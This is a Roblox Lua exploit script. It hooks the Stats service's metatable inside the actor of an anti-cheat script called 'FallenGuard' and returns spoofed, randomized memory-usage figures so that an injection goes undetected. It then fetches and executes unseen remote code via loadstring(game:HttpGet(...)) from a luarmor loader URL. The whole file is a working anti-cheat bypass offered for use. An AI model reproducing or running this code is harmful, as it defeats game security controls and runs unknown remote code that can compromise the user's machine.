local memory = {};
memory.tags = {'Internal','HttpCache','Instances','Signals','LuaHeap','Script','PhysicsCollision','PhysicsParts','GraphicsSolidModels','GraphicsMeshParts','GraphicsParticles','GraphicsParts','GraphicsSpatialHash','GraphicsTerrain','GraphicsTexture','GraphicsTextureCharacter','Sounds','StreamingSounds','TerrainVoxels','Gui','Animation','Navigation','GeometryCSG'}
memory.run = function(func)
    if (not memorystats[func]) then return; end
    local total = 0;
    for i = 1, #memory.tags do
        local value = memorystats[func](memory.tags[i]);
        if (typeof(value) == 'number') then
            total += value
        end
    end
    return total;
end
memory.cache = function() memory.run('cache'); end
memory.restore = function() memory.run('restore'); end
memory.getusage = function() memory.run('getusagebyname') end
memory.getusagebyname = memorystats.getusagebyname;

-- memory chaching to protect against mem spikes when loading bypass
memory.cache();

getgenv()['game'] = cloneref(game);
getgenv()['workspace'] = cloneref(workspace);
local stats = game:GetService('Stats');
local players = game:GetService('Players');
local runservice = game:GetService('RunService');

local localplayer = players.LocalPlayer;
local playerscripts = localplayer.PlayerScripts;
local fallenguard = playerscripts.FallenGuard;

local run = [[

    getgenv()['game'] = cloneref(game);
    getgenv()['workspace'] = cloneref(workspace);

    local math_abs = math.abs;
    local math_random = math.random;

    local stats = game:GetService('Stats');
    local players = game:GetService('Players');
    local runservice = game:GetService('RunService');

    local localplayer = players.LocalPlayer;
    local playerscripts = localplayer.PlayerScripts;
    local fallenguard = playerscripts.FallenGuard;

    local memusage = stats:GetTotalMemoryUsageMb();

    local mt = getrawmetatable(stats);
    local oldnamecall = mt.__namecall;
    setreadonly(mt, false);
    mt.__namecall = function(self, ...)
        local method = getnamecallmethod();
        if (method == 'GetTotalMemoryUsageMb') then
            return memusage + math_random(-40, 40) + math_random();
        end
        return oldnamecall(self, ...);
    end
    setreadonly(mt, true);

]]
run_on_actor(fallenguard, run);

memory.restore();
warn("loaded")

wait(1)

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3c7f0b8e4882c14868874b72c70e8340.lua"))()

